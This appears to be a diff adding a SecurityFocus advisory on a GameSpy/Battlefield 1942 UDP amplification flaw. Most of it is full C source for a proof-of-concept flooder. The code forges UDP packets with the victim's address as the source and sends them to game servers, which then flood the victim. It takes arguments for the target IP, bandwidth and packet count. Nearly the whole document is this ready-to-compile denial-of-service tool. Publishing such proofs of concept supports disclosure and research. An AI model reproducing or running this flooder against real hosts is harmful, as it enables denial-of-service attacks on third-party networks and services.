@@ -1,0 +1,234 @@
+source: http://www.securityfocus.com/bid/6636/info
+
+A vulnerability has been reported for several games that support the use of the GameSpy network.
+
+A game client typically queries a game server using the UDP protocol. It has been reported that a simple query by a client may result in a game server responding with overly large responses which may result in the saturation of available network bandwidth.
+
+Exploitation of this issue may aid in launching denial of service attacks against other hosts and networks.
+
+/************************************************************************/
+/* Battlefield 1942 - All Versions flooder (proof-of-concept)   	*/
+/*         by Mike Kristovich (mkristovich@pivx.com)			*/
+/* 									*/
+/* Filename: bf1942dos.c						*/
+/* Location: http://www.pivx.com/kristovich/poc/bf1942dos.c		*/
+/*  									*/
+/* Proof-of-concept code for PivX Security Advisory MK#001		*/
+/*  									*/
+/* Linux version (MK-POC-001/1.0)					*/
+/*  									*/
+/* Description of code:							*/
+/*  This exploit will spoof UDP packets from a source which you 	*/
+/*  specify, to a Battlefield 1942 server.  The server will send	*/
+/*  packets to the victim, regardless of victim status.			*/
+/*									*/
+/*									*/
+/* This source has been tested and compiled on Linux.  			*/
+/* This source is covered by the GNU GPL.				*/
+/************************************************************************/
+/* Thanks to Luigi for assistance with the code!			*/
+/************************************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <netdb.h>
+#include <string.h>
+
+
+#define IPSZ		sizeof(struct iphdr)
+#define UDPSZ		sizeof(struct udphdr)
+#define DATASZ		sizeof(STRING) - 1
+#define PSEUDOSZ	sizeof(struct pseudohdr)
+#define BUFFSZ		100
+#define SIZE		(IPSZ + UDPSZ + DATASZ)
+#define STRING		"\\players\\status\\packets\\rules\\"
+#define SRCPORT		1204
+#define DSTPORT		230
+
+u_short in_cksum(unsigned short *addr, int len);
+u_long resolv(char *host);
+void std_err(void);
+
+
+struct pseudohdr {
+	u_int32_t	saddr;
+	u_int32_t	daddr;
+	u_int8_t	zero;
+	u_int8_t	protocol;
+	u_int16_t	length;
+} *pseudohdr;
+
+
+int main(int argc, char *argv[]) {
+ 
+	u_char	buff[BUFFSZ],
+		pseudobuff[BUFFSZ],
+		*data;
+	struct	sockaddr_in 	peer;
+	struct	iphdr	*iphdr;
+	struct	udphdr	*udphdr;
+	int	shandle,
+		err;
+	u_int32_t	source,
+			dest;
+	u_int16_t	sport,
+			dport;
+
+	int packetsent;
+	int maxpackets;
+	int pktdoubler;
+	int bandwidth;
+
+	printf("\r\n---------------------------------------------------\r\n");
+	printf("      Game Server DoS  -  Proof-of-Concept\r\n");
+	printf("   by Mike Kristovich, PivX Security Researcher\r\n");
+	printf("= http://www.PivX.com :    : mkristovich@pivx.com =\r\n");
+	printf("---------------------------------------------------\r\n");
+	printf("= Advisory MK#001 :        : Battlefield 1942 DoS =\r\n");
+	printf("---------------------------------------------------\r\n");
+
+
+
+	setbuf(stdout, NULL);
+	
+	if(argc < 4)
+	{
+	  fprintf(stderr,"Usage: %s <IP_to_flood> <Server_IP> <kBps_to_use> <#_packets>\r\n",*argv);
+	  printf(":: Options :: <victim_port[default 53]> <server_port[default 23000]>\r\n");
+	  exit(1);
+        };
+
+	source = resolv(argv[1]);
+	dest   = resolv(argv[2]);
+
+	if (!argv[6])
+          dport  = DSTPORT;
+	else
+	  dport  = atoi(argv[6]);
+     
+	if (!argv[5]) 
+	   sport =  SRCPORT;
+	else
+	   sport  = atoi(argv[5]);
+	
+
+	printf("Sending packets to server ...");
+ 
+	
+	peer.sin_addr.s_addr = dest;
+	peer.sin_port        = htons(dport);
+	peer.sin_family      = AF_INET;
+
+	iphdr     = (struct iphdr *)buff;
+	udphdr    = (struct udphdr *)(buff + IPSZ);
+	data      = (u_char *)(buff + IPSZ + UDPSZ);
+	pseudohdr = (struct pseudohdr *)pseudobuff;
+
+	/* build data */
+	memcpy(data, STRING, DATASZ);
+
+	/* build IP header */
+	iphdr->ihl      = 5;
+	iphdr->version  = 4;
+	iphdr->tos      = 0x8;
+	iphdr->tot_len  = SIZE;
+	iphdr->id       = 156;
+	iphdr->frag_off = 0;
+	iphdr->ttl      = 128;
+	iphdr->protocol = IPPROTO_UDP;
+	iphdr->check    = 0;
+	iphdr->saddr    = source;
+	iphdr->daddr    = dest;
+
+	/* build UDP header */
+	udphdr->source = htons(sport);
+	udphdr->dest   = htons(dport);
+	udphdr->check  = 0;
+	udphdr->len    = htons(UDPSZ + DATASZ);
+
+	/* build pseudo header for calculate checksum (copy UDP header and data in it) */
+	memcpy(pseudobuff + PSEUDOSZ, buff + IPSZ, UDPSZ + DATASZ);
+
+	pseudohdr->saddr    = iphdr->saddr;
+	pseudohdr->daddr    = iphdr->daddr;
+	pseudohdr->zero     = 0;
+	pseudohdr->protocol = IPPROTO_UDP;
+	pseudohdr->length   = udphdr->len;
+
+	udphdr->check = in_cksum((u_short *)pseudobuff, PSEUDOSZ + UDPSZ + DATASZ);
+
+	/* send all */
+	shandle = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	if(shandle < 0) std_err();
+	
+	/* do kbps handling */
+
+	/* set up max packets */
+	maxpackets = atoi(argv[4]);
+	/* set up packet-doubler bandwidth management */
+	bandwidth = atoi(argv[3]);
+
+	for (packetsent = 0; packetsent < maxpackets; packetsent++) {
+
+	  for (pktdoubler = 0; pktdoubler < bandwidth; pktdoubler++) {
+            err = sendto(shandle, buff, SIZE, 0, (struct sockaddr *)&peer, sizeof(peer));
+     	    if(err < 0) std_err();
+	    packetsent++;
+	  };
+	    usleep(24000);
+	
+	};
+
+	printf("\r\nSpoofed packets sent to Battlefield 1942 server.\r\n");
+	close(shandle);
+
+	return(0);
+}
+
+
+u_short in_cksum(unsigned short *addr, int len) {
+        int	sum = 0;
+        u_short	answer = 0;
+        register	u_short *w = addr;
+        register int	nleft = len;
+
+        while(nleft > 1)  {
+                sum += *w++;
+                nleft -= 2;
+        }
+        if(nleft == 1) {
+                *(u_char *)(&answer) = *(u_char *)w ;
+                sum += answer;
+        }
+        sum = (sum >> 16) + (sum & 0xffff);
+        sum += (sum >> 16);
+        answer = ~sum;
+        return(answer);
+}
+
+
+u_long resolv(char *host) {
+	struct	hostent	*hp;
+	u_long	host_ip;
+
+	host_ip = inet_addr(host);
+	if(host_ip == INADDR_NONE) {
+		hp = gethostbyname(host);
+		if(hp == 0) std_err();
+		else host_ip = *(u_long *)(hp->h_addr);
+	}
+
+	return(host_ip);
+}
+
+
+void std_err(void) {
+	perror("\nError");
+	exit(1);
+}
